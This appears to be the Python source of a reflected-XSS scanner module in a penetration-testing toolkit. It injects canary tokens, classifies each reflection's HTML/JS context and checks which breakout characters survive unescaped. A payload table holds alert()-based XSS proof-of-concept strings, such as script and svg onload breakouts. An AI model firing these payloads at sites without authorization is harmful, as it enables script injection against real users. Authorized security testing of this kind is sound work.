"""Reflected cross-site-scripting (XSS) probe -- reflection-context analysis.

Injects a unique, unencoded-safe canary token into each query/body parameter
of a target request, locates every place the canary comes back in the HTML
response, and classifies the *context* each reflection lands in (plain HTML
text, a single- or double-quoted attribute value, inside a ``<script>`` JS
string, an HTML comment, or a tag name). A second, cheap follow-up request
wraps the canary with the classic breakout metacharacters
(``< > " ' `` ` `` / =``) and checks -- purely by string inspection of the raw
response body -- which of them survive unescaped next to the canary. Only
when a metacharacter *relevant to the observed context* survives raw is a
finding raised, with a context-appropriate suggested payload attached.

This module does **no** browser rendering and does **not** attempt to prove
JavaScript actually executes -- it is a static, deterministic reflection/
context analysis only. It never tests for stored or DOM-based XSS.

Design constraints (redkit invariants):
    * NO AI/LLM usage - every verdict here is a deterministic string
      comparison / heuristic parse, no model of any kind.
    * Pure standard library. All HTTP goes through the shared
      :mod:`redkit.core.http` client (proxy/cookie/header/TLS/timeout aware).
    * Bounded: the number of parameters tested is capped, and each tested
      parameter costs at most two requests (one baseline reflection probe,
      one breakout-character probe) -- no recursion, no wordlists.
    * Safe by default: GET is the default method; a body is only sent when
      the operator explicitly selects ``method=POST`` and supplies ``data``.

This is for AUTHORIZED security testing only.
"""
from __future__ import annotations

import re
import urllib.parse
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Optional, Sequence, Set, Tuple

from redkit.core.http import WEB_COMMON_OPTIONS, HttpClient, client_from_opts
from redkit.core.module import Module, Option, Result
from redkit.core.registry import register

# --------------------------------------------------------------------------- #
# bounds - hard invariants, not operator-configurable
# --------------------------------------------------------------------------- #
MAX_PARAMS = 20              # hard cap on parameters tested per run
MAX_THREADS = 10             # concurrent worker threads (<= 20 per invariant)
MAX_OCCURRENCES = 20         # cap on reflection positions inspected per response
MAX_ANALYZE_CHARS = 3_000_000  # defensive cap on response text scanned
CONTEXT_WINDOW = 400          # chars of surrounding markup inspected per occurrence
SAMPLE_PAD = 40               # chars of context kept either side of a sample snippet

# The classic HTML/JS breakout metacharacters we test for raw survival.
BREAKOUT_CHARS: List[str] = ["<", ">", '"', "'", "`", "/", "="]

# Which of the breakout characters actually matter for each observed context
# (i.e. which one(s) would let an attacker escape that context).
RELEVANT_CHARS: Dict[str, Set[str]] = {
    "html-text": {"<", ">"},
    "tag-name": {"<", ">", "/"},
    "attr-double-quoted": {'"', "<", ">"},
    "attr-single-quoted": {"'", "<", ">"},
    "attr-unquoted": {"=", ">", "<"},
    "html-comment": {">"},
    "script-string-double": {'"', "<", "/"},
    "script-string-single": {"'", "<", "/"},
    "script-string-backtick": {"`", "<", "/"},
    "script-code": {"<", "/"},
}

# A short, context-appropriate proof-of-concept payload to suggest once a
# context is confirmed breakable. These are illustrative, not auto-fired.
CONTEXT_PAYLOADS: Dict[str, str] = {
    "html-text": "<script>alert(document.domain)</script>",
    "tag-name": "><svg onload=alert(document.domain)>",
    "attr-double-quoted": '"><script>alert(document.domain)</script>',
    "attr-single-quoted": "'><script>alert(document.domain)</script>",
    "attr-unquoted": "x onmouseover=alert(document.domain)//",
    "html-comment": "--><script>alert(document.domain)</script>",
    "script-string-double": '";alert(document.domain);//',
    "script-string-single": "';alert(document.domain);//",
    "script-string-backtick": "`;alert(document.domain);//",
    "script-code": "</script><script>alert(document.domain)</script>",
}

_TAG_NAME_RE = re.compile(r"^[a-zA-Z][a-zA-Z0-9]*$")


# --------------------------------------------------------------------------- #
# small pure helpers
# --------------------------------------------------------------------------- #
def _normalize_url(raw: str) -> str:
    raw = (raw or "").strip()
    if raw and "://" not in raw:
        raw = "http://" + raw
    return raw


def _canary() -> str:
    """A short, unique, lower-case-hex token -- immune to case-folding."""
    return "rk" + uuid.uuid4().hex[:12]


def _split_url(url: str) -> Tuple[str, List[Tuple[str, str]]]:
    """Split ``url`` into a query-free base and its parsed query pairs."""
    parts = urllib.parse.urlsplit(url)
    query_pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    base = urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, "", ""))
    return base, query_pairs


def _parse_body(data: str) -> List[Tuple[str, str]]:
    """Parse an ``application/x-www-form-urlencoded`` body template."""
    data = (data or "").strip()
    if not data:
        return []
    return urllib.parse.parse_qsl(data, keep_blank_values=True)


def _collect_targets(
    query_pairs: Sequence[Tuple[str, str]],
    body_pairs: Sequence[Tuple[str, str]],
    method: str,
    requested_param: str,
) -> List[Dict[str, Any]]:
    """Build the ordered, de-duplicated list of (name, location) to test."""
    targets: List[Dict[str, Any]] = []
    if requested_param:
        found_query = any(k == requested_param for k, _ in query_pairs)
        found_body = method == "POST" and any(k == requested_param for k, _ in body_pairs)
        if found_query:
            targets.append({"name": requested_param, "location": "query"})
        if found_body:
            targets.append({"name": requested_param, "location": "body"})
        if not found_query and not found_body:
            # Not part of the original request: add it as a synthetic
            # parameter, favouring the query string unless we are POSTing.
            loc = "body" if method == "POST" else "query"
            targets.append({"name": requested_param, "location": loc, "synthetic": True})
    else:
        seen: Set[Tuple[str, str]] = set()
        for k, _ in query_pairs:
            key = ("query", k)
            if key not in seen:
                seen.add(key)
                targets.append({"name": k, "location": "query"})
        if method == "POST":
            for k, _ in body_pairs:
                key = ("body", k)
                if key not in seen:
                    seen.add(key)
                    targets.append({"name": k, "location": "body"})
    return targets[:MAX_PARAMS]


def _apply_value(
    query_pairs: Sequence[Tuple[str, str]],
    body_pairs: Sequence[Tuple[str, str]],
    target: Dict[str, Any],
    value: str,
) -> Tuple[List[Tuple[str, str]], List[Tuple[str, str]]]:
    """Return copies of (query_pairs, body_pairs) with ``target`` set to ``value``."""
    q = list(query_pairs)
    b = list(body_pairs)
    name = target["name"]
    pairs = q if target["location"] == "query" else b
    replaced = False
    for i, (k, _v) in enumerate(pairs):
        if k == name and not replaced:
            pairs[i] = (k, value)
            replaced = True
    if not replaced:
        pairs.append((name, value))
    return q, b


def _send(client: HttpClient, base_url: str, method: str, q_pairs: List[Tuple[str, str]], b_pairs: List[Tuple[str, str]]):
    data = None
    headers = None
    if method == "POST":
        data = urllib.parse.urlencode(b_pairs)
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
    return client.request(method, base_url, params=q_pairs, data=data, headers=headers)


def _find_positions(text: str, token: str, limit: int = MAX_OCCURRENCES) -> List[int]:
    positions: List[int] = []
    start = 0
    while len(positions) < limit:
        idx = text.find(token, start)
        if idx == -1:
            break
        positions.append(idx)
        start = idx + len(token)
    return positions


def _enclosing_js_quote(code: str) -> Optional[str]:
    """Best-effort: walk ``code`` (JS source after the ``<script ...>`` tag up
    to the reflection point) tracking an open quote/backtick, honouring
    backslash escapes. Returns the still-open quote char, or ``None``."""
    open_quote: Optional[str] = None
    i = 0
    n = len(code)
    while i < n:
        c = code[i]
        if open_quote:
            if c == "\\":
                i += 2
                continue
            if c == open_quote:
                open_quote = None
        elif c in ("'", '"', "`"):
            open_quote = c
        i += 1
    return open_quote


def _classify_context(text: str, pos: int, marker_len: int) -> str:
    """Classify the HTML/JS context a reflection at ``[pos, pos+marker_len)`` sits in."""
    window_start = max(0, pos - CONTEXT_WINDOW)
    low = text.lower()  # case-insensitive tag matching; same length as `text` (ASCII tags)

    # 1. Inside an open <script> ... </script> block?
    last_script_open = low.rfind("<script", window_start, pos)
    if last_script_open != -1:
        # confirm nothing closed the block between the open tag and pos
        closing = low.find("</script", last_script_open, pos)
        if closing == -1:
            gt = text.find(">", last_script_open, pos)
            if gt != -1:
                code = text[gt + 1 : pos]
                quote = _enclosing_js_quote(code)
                if quote == '"':
                    return "script-string-double"
                if quote == "'":
                    return "script-string-single"
                if quote == "`":
                    return "script-string-backtick"
                return "script-code"

    # 2. Inside an open HTML comment <!-- ... -->?
    last_comment_open = text.rfind("<!--", window_start, pos)
    if last_comment_open != -1:
        closing = text.find("-->", last_comment_open, pos)
        if closing == -1:
            return "html-comment"

    # 3. Inside an open tag <tag attr="val" ...>?
    last_tag_open = text.rfind("<", window_start, pos)
    if last_tag_open != -1:
        gt = text.find(">", last_tag_open, pos)
        if gt == -1:
            tag_prefix = text[last_tag_open + 1 : pos]
            # empty (`<CANARY`) or a lone slash (`</CANARY`, a closing tag
            # name) both mean the canary IS the tag name, not an attribute
            if tag_prefix in ("", "/") or _TAG_NAME_RE.match(tag_prefix):
                return "tag-name"
            dq = tag_prefix.count('"')
            sq = tag_prefix.count("'")
            if dq % 2 == 1:
                return "attr-double-quoted"
            if sq % 2 == 1:
                return "attr-single-quoted"
            return "attr-unquoted"

    return "html-text"


def _build_breakout_value(token: str) -> Tuple[str, Dict[str, str]]:
    """Build one combined probe value wrapping a distinct sub-canary in each
    breakout metacharacter, so a single request tests every character.

    Returns ``(payload_value, {char: sub_canary})``.
    """
    parts: List[str] = []
    marker_for_char: Dict[str, str] = {}
    for i, ch in enumerate(BREAKOUT_CHARS):
        sub = f"{token}b{i}"
        marker_for_char[ch] = sub
        parts.append(f"{ch}{sub}{ch}")
    return "".join(parts), marker_for_char


def _check_breakout_survival(text: str, marker_for_char: Dict[str, str]) -> List[str]:
    """Return the subset of characters that appear raw (unescaped) either side
    of their sub-canary in ``text``."""
    survived: List[str] = []
    for ch, sub in marker_for_char.items():
        idx = text.find(sub)
        if idx == -1:
            continue
        before = text[idx - 1 : idx] if idx > 0 else ""
        after_idx = idx + len(sub)
        after = text[after_idx : after_idx + 1]
        if before == ch and after == ch:
            survived.append(ch)
    return survived


def _sample(text: str, pos: int, marker_len: int) -> str:
    start = max(0, pos - SAMPLE_PAD)
    end = min(len(text), pos + marker_len + SAMPLE_PAD)
    return text[start:end]


# --------------------------------------------------------------------------- #
# module
# --------------------------------------------------------------------------- #
@register
class ReflectedXss(Module):
    """Reflected-XSS canary/context probe (no browser, no stored/DOM testing)."""

    name = "web.xss"
    description = "Reflected XSS probe: canary reflection + context/breakout-character analysis"
    phase = "web"
    options = [
        Option("url", help="target URL, e.g. http://host/search?q=test", required=True),
        Option("param", default="", help="single parameter name to test; empty = every query/body parameter"),
        Option("method", default="GET", choices=["GET", "POST"], help="HTTP method used to send probe requests"),
        Option(
            "data",
            default="",
            help="application/x-www-form-urlencoded body template for method=POST, e.g. 'user=admin&comment=hi'",
        ),
    ] + WEB_COMMON_OPTIONS
    references = [
        "https://owasp.org/www-community/attacks/xss/",
        "https://portswigger.net/web-security/cross-site-scripting",
        "https://owasp.org/www-project-web-security-testing-guide/latest/"
        "4-Web_Application_Security_Testing/07-Input_Validation_Testing/"
        "11-Testing_for_Cross_Site_Scripting",
    ]

    # ---------------------------------------------------------------- run -- #
    def run(self, opts: Dict[str, Any], ctx) -> Result:  # noqa: C901 - linear pipeline
        console = ctx.console
        url = _normalize_url(str(opts.get("url") or ""))
        method = str(opts.get("method") or "GET").strip().upper()
        if method not in ("GET", "POST"):
            method = "GET"
        requested_param = str(opts.get("param") or "").strip()

        parsed = urllib.parse.urlparse(url)
        if parsed.scheme not in ("http", "https") or not parsed.hostname:
            return Result(ok=False, summary=f"invalid url: {opts.get('url')!r} (expected http(s)://host[...])")
        host = parsed.hostname

        base, query_pairs = _split_url(url)
        body_pairs = _parse_body(str(opts.get("data") or "")) if method == "POST" else []

        targets = _collect_targets(query_pairs, body_pairs, method, requested_param)
        empty_data = {"url": url, "method": method, "reflections": []}
        if not targets:
            msg = (
                f"no parameter found on {url!r} to test "
                "(pass ?name=value in the URL, set 'param', or supply 'data' with method=POST)"
            )
            console.warn(msg)
            return Result(ok=True, summary=msg, data=empty_data)

        capped_note = ""
        if requested_param == "" and (
            len(query_pairs) + (len(body_pairs) if method == "POST" else 0) > MAX_PARAMS
        ):
            capped_note = f" (capped at {MAX_PARAMS} parameters)"

        client = client_from_opts(opts)
        console.banner("Reflected XSS probe", url)
        console.info(
            f"{method} {url}: testing {len(targets)} parameter(s){capped_note} "
            f"via {min(MAX_THREADS, len(targets))} worker(s)"
        )

        reflections: List[Dict[str, Any]] = []
        findings = 0
        workers = max(1, min(MAX_THREADS, len(targets)))
        with ThreadPoolExecutor(max_workers=workers) as pool:
            future_map = {
                pool.submit(self._test_target, client, base, method, query_pairs, body_pairs, target): target
                for target in targets
            }
            for future in as_completed(future_map):
                target = future_map[future]
                try:
                    entries = future.result()
                except Exception as exc:  # noqa: BLE001 - a probe must never abort the run
                    entries = [
                        {
                            "param": target["name"],
                            "location": target["location"],
                            "reflected": False,
                            "error": str(exc)[:200],
                        }
                    ]
                reflections.extend(entries)

        reflections.sort(key=lambda e: (e.get("location", ""), e.get("param", ""), e.get("context") or ""))

        for entry in reflections:
            if not entry.get("reflected"):
                if entry.get("error"):
                    console.warn(f"[{entry['location']}] {entry['param']}: unreachable ({entry['error']})")
                else:
                    console.info(f"[{entry['location']}] {entry['param']}: not reflected")
                continue
            if entry.get("exploitable"):
                findings += 1
                title = f"Reflected XSS: parameter '{entry['param']}' ({entry['location']}, {entry['context']})"
                description = (
                    f"{method} {url}: parameter '{entry['param']}' is reflected inside a "
                    f"{entry['context']} context and the metacharacter(s) "
                    f"{', '.join(entry['exploitable_chars'])} survive un-encoded. "
                    f"Suggested payload: {entry['suggested_payload']}"
                )
                ctx.engagement.add_finding(
                    title,
                    severity=entry["severity"],
                    host=host,
                    description=description,
                    evidence=entry.get("sample", ""),
                )
                console.bad(
                    f"[{entry['location']}] {entry['param']} ({entry['context']}): "
                    f"breakout via {','.join(entry['exploitable_chars'])} -> {entry['severity']}"
                )
            else:
                console.info(
                    f"[{entry['location']}] {entry['param']}: reflected in {entry['context']} "
                    f"(no relevant metacharacter survived un-encoded)"
                )

        summary = (
            f"{url}: {len(targets)} parameter(s) tested, "
            f"{sum(1 for e in reflections if e.get('reflected'))} reflection(s), "
            f"{findings} exploitable reflected-XSS finding(s)"
        )
        ctx.engagement.add_note(f"web.xss: {summary}")
        return Result(ok=True, summary=summary, data={"url": url, "method": method, "reflections": reflections})

    # -------------------------------------------------------- internals -- #
    def _test_target(
        self,
        client: HttpClient,
        base: str,
        method: str,
        query_pairs: List[Tuple[str, str]],
        body_pairs: List[Tuple[str, str]],
        target: Dict[str, Any],
    ) -> List[Dict[str, Any]]:
        """Run the baseline + breakout probes for a single parameter.

        Returns a list of reflection entries: one "not reflected" entry, or
        one entry per distinct context the canary landed in.
        """
        name = target["name"]
        location = target["location"]

        # -- step 1: baseline canary reflection + context classification -- #
        baseline_canary = _canary()
        q1, b1 = _apply_value(query_pairs, body_pairs, target, baseline_canary)
        resp1 = _send(client, base, method, q1, b1)
        if resp1.error is not None:
            return [{"param": name, "location": location, "reflected": False, "error": resp1.error}]

        text1 = resp1.text
        if len(text1) > MAX_ANALYZE_CHARS:
            text1 = text1[:MAX_ANALYZE_CHARS]
        positions = _find_positions(text1, baseline_canary)
        if not positions:
            return [{"param": name, "location": location, "reflected": False}]

        contexts: List[str] = []
        samples: Dict[str, str] = {}
        for pos in positions:
            ctxt = _classify_context(text1, pos, len(baseline_canary))
            if ctxt not in contexts:
                contexts.append(ctxt)
                samples[ctxt] = _sample(text1, pos, len(baseline_canary))

        # -- step 2: one combined breakout-character probe -------------- #
        breakout_token = _canary()
        payload_value, marker_for_char = _build_breakout_value(breakout_token)
        q2, b2 = _apply_value(query_pairs, body_pairs, target, payload_value)
        resp2 = _send(client, base, method, q2, b2)
        breakout_survived: List[str] = []
        if resp2.error is None:
            text2 = resp2.text
            if len(text2) > MAX_ANALYZE_CHARS:
                text2 = text2[:MAX_ANALYZE_CHARS]
            breakout_survived = _check_breakout_survival(text2, marker_for_char)

        entries: List[Dict[str, Any]] = []
        for ctxt in contexts:
            relevant = RELEVANT_CHARS.get(ctxt, {"<", ">"})
            exploitable_chars = sorted(c for c in breakout_survived if c in relevant)
            exploitable = bool(exploitable_chars)
            severity: Optional[str] = None
            suggested: Optional[str] = None
            if exploitable:
                severity = "high" if ("<" in breakout_survived and ">" in breakout_survived) else "medium"
                suggested = CONTEXT_PAYLOADS.get(ctxt)
            entries.append(
                {
                    "param": name,
                    "location": location,
                    "reflected": True,
                    "context": ctxt,
                    "canary": baseline_canary,
                    "sample": samples.get(ctxt, ""),
                    "breakout_survived": sorted(breakout_survived),
                    "relevant_chars": sorted(relevant),
                    "exploitable_chars": exploitable_chars,
                    "exploitable": exploitable,
                    "severity": severity,
                    "suggested_payload": suggested,
                }
            )
        return entries
